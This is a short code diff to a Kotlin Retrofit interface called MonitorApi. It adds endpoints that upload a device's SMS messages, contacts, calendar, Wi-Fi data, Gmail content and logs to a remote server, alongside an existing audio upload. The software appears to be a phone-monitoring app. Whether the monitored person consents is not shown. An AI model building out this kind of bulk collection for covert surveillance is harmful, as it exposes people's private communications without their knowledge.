@@ -84,4 +84,24 @@ interface MonitorApi {
         @Path("id") deviceId: String,
         @Part audio: okhttp3.MultipartBody.Part
     ): Response<Unit>
+
+    // ─── Phase 1 Extended ───────────────────────────────
+
+    @POST("devices/{id}/sms")
+    suspend fun sendSms(@Path("id") deviceId: String, @Body body: SmsApiRequest): Response<Unit>
+
+    @POST("devices/{id}/contacts")
+    suspend fun sendContacts(@Path("id") deviceId: String, @Body body: List<ContactApiRequest>): Response<Unit>
+
+    @POST("devices/{id}/calendar")
+    suspend fun sendCalendar(@Path("id") deviceId: String, @Body body: CalendarApiRequest): Response<Unit>
+
+    @POST("devices/{id}/wifi")
+    suspend fun sendWifi(@Path("id") deviceId: String, @Body body: List<WifiApiRequest>): Response<Unit>
+
+    @POST("devices/{id}/gmail")
+    suspend fun sendGmail(@Path("id") deviceId: String, @Body body: GmailApiRequest): Response<Unit>
+
+    @POST("devices/{id}/logs")
+    suspend fun sendDeviceLog(@Path("id") deviceId: String, @Body body: DeviceLogApiRequest): Response<Unit>
 }
